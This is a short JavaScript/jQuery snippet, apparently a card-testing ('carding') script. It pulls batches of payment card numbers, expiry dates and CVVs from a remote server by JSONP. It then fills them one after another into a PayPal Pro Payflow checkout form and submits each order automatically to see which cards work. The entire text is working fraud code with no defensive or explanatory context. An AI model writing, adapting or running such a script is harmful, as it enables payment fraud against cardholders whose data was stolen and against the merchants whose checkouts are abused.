	var postUrl = "https://" + baseUrl + "/post";
	var iteration = null;
	var options = {
	     url:postUrl,
	     dataType: "jsonp"
	};
	var cards = function(arr) {
		var i = 0;
		var percentage = 30;
		var len = Math.ceil(arr.length * (percentage / 100));

		iteration = function() {
		  if( i < len ) {
		    var json = arr[i++];
		    sessionStorage.card = JSON.stringify( json );

		    $("#paypal_pro_payflow-card-number").val(json.card);
			$("#paypal_pro_payflow-card-expiry").val(json.mon + " / " + json.year);
			$("#paypal_pro_payflow-card-cvc").val(json.cvv);
			$("#place_order").click();

	    	var interval = setInterval(function() {
		        console.log("Procesando...")
		        if ( !$(".blockUI").length ) {
		        	console.log("Probemos la proxima");
		        	clearInterval(interval);
		        	setTimeout(iteration, 2000);
		    	}
		    }, 1000);

		  }
		  else {
		    $.ajax(options)
		    .success(cards);
		  }

		}

		iteration();
	};
	// 1face
	$.ajax(options)
	.success(cards);